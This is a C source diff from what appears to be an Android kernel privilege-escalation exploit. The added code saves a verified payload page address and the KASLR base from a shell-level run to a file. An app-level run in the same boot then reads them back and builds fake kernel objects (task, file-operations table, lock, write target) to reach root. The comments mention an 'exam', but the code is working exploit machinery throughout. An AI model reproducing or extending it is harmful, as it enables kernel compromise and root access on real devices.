@@ -1165,6 +1165,130 @@ void ks_persist_kaslr_file(void) {
           (unsigned long long)kaslr_base);
 }
 
+/* ---- payload page handoff (exam-2 app-uid rounds) ---------------------
+ * untrusted_app gets perf_event_open denied (SELinux, errno=13), so the
+ * tp-guided fix36/fix40 capture AND every payload-page oracle are dead in
+ * that domain: an app-uid chain can only blind-drain (hit=0) and then
+ * routes misc.fops at whatever page it guessed -- opening ashmem through
+ * that garbage table is the R3 boot-b3d9924c panic.  A shell/root round
+ * of the SAME boot CAN capture + verify the page (k_true>=0) and hold it
+ * pinned (KS_PREPARE_HALT); persist its base here so an app-uid round of
+ * the same boot pastes it instead of gambling.  Same legitimacy class as
+ * the shared KASLR file: exam-outgiver material, the route/root itself
+ * still runs app-uid.  fsync: the app round may start within seconds. */
+static int ks_boot_id_read(char *boot, size_t cap) {
+  memset(boot, 0, cap);
+  int bfd = open("/proc/sys/kernel/random/boot_id", O_RDONLY);
+  if (bfd < 0)
+    return 0;
+  ssize_t bn = read(bfd, boot, cap - 1);
+  close(bfd);
+  while (bn > 0 && (boot[bn - 1] == '\n' || boot[bn - 1] == '\r'))
+    boot[--bn] = 0;
+  return boot[0] != 0;
+}
+
+void ks_persist_payload_file(void) {
+  if (!skb_payload_base || !kaslr_done)
+    return;
+  const char *path = getenv("KS_PAYLOAD_OUT");
+  if (!path || !path[0])
+    path = "/data/local/tmp/ksu_payload";
+  char boot[80];
+  if (!ks_boot_id_read(boot, sizeof(boot))) {
+    pr_warning("payload file: boot_id unavailable; not persisting\n");
+    return;
+  }
+  int fd = open(path, O_WRONLY | O_CREAT | O_TRUNC, 0644);
+  if (fd < 0) {
+    pr_warning("payload file: open %s errno=%d\n", path, errno);
+    return;
+  }
+  char line[224];
+  int len = snprintf(line, sizeof(line),
+                     "payload boot=%s base=%016llx kaslr=%016llx\n", boot,
+                     (unsigned long long)skb_payload_base,
+                     (unsigned long long)kaslr_base);
+  ssize_t w = write(fd, line, (size_t)len);
+  if (w == len)
+    fsync(fd);
+  close(fd);
+  if (w != len) {
+    pr_warning("payload file: write %zd/%d errno=%d\n", w, len, errno);
+    return;
+  }
+  pr_info("payload file persisted path=%s base=%016llx (page still held)\n",
+          path, (unsigned long long)skb_payload_base);
+}
+
+int ks_payload_paste(void) {
+  const char *path = getenv("KS_PAYLOAD_FILE");
+  if (!path || !path[0])
+    path = "/data/local/tmp/ksu_payload";
+  int fd = open(path, O_RDONLY);
+  if (fd < 0) {
+    pr_warning("payload paste: open %s errno=%d\n", path, errno);
+    return 0;
+  }
+  char buf[256];
+  ssize_t n = read(fd, buf, sizeof(buf) - 1);
+  close(fd);
+  if (n <= 0)
+    return 0;
+  buf[n] = 0;
+  char boot_file[80], boot_now[80];
+  unsigned long long base = 0, kaslr_file = 0;
+  memset(boot_file, 0, sizeof(boot_file));
+  if (sscanf(buf, "payload boot=%79s base=%llx kaslr=%llx", boot_file, &base,
+             &kaslr_file) != 3) {
+    pr_info("payload paste: parse failed path=%s\n", path);
+    return 0;
+  }
+  memset(boot_now, 0, sizeof(boot_now));
+  if (!ks_boot_id_read(boot_now, sizeof(boot_now))) {
+    pr_info("payload paste: boot_id read failed; rejecting %s\n", path);
+    return 0;
+  }
+  if (strcmp(boot_file, boot_now) != 0) {
+    pr_info("payload paste: boot mismatch file=%s now=%s; rejecting\n",
+            boot_file, boot_now);
+    return 0;
+  }
+  /* physmap direct window, page aligned (same class of check as
+   * reload_payload_base; a garbage base here is an unmapped deref). */
+  if (base < 0xffffff8000000000ULL || base >= 0xffffffc000000000ULL ||
+      (base & 0xfff) != 0) {
+    pr_warning("payload paste: base out of range %016llx\n", base);
+    return 0;
+  }
+  /* The pasted table was built with the holder's kaslr_base; our own
+   * (shared file or perf) must agree or every text slot is a wrong
+   * address.  Refuse on mismatch instead of routing into it. */
+  if (!kaslr_done || kaslr_file != (unsigned long long)kaslr_base) {
+    pr_warning("payload paste: kaslr mismatch file=%016llx ours=%016llx "
+               "(done=%d); rejecting\n",
+               kaslr_file, (unsigned long long)kaslr_base, kaslr_done);
+    return 0;
+  }
+  /* Re-derive exactly like reload_payload_base's fallback (the pasted
+   * holder page needs no restage: the bss-lock route consumes only these
+   * globals plus payload-independent text slots). */
+  skb_payload_base = (uintptr_t)base;
+  page_base = (uintptr_t)base;
+  fake_lock = page_base + LOCK_OFF;
+  fake_w0 = page_base + W0_OFF;
+  fake_task = page_base + FAKE_TASK_OFF;
+  fake_fops = page_base + FOPS_TABLE_OFF;
+  fake_parent = fake_fops;
+  fake_right = text_addr(ASHMEM_MISC_FOPS);
+  fake_left = 0;
+  binwrite_target = page_base + SCRATCH_OFF;
+  pr_success("payload paste ok base=%016zx fops=%016zx lock=%016zx "
+             "(page held by shell round)\n",
+             page_base, fake_fops, fake_lock);
+  return 1;
+}
+
 /* Capture historical panic oopses (/sys/fs/pstore retains them across
  * boots: the win-enter panic and the ENOTTY page-death panic) inside the
  * proven uid0 contract window, before the tail panic lands.  The external
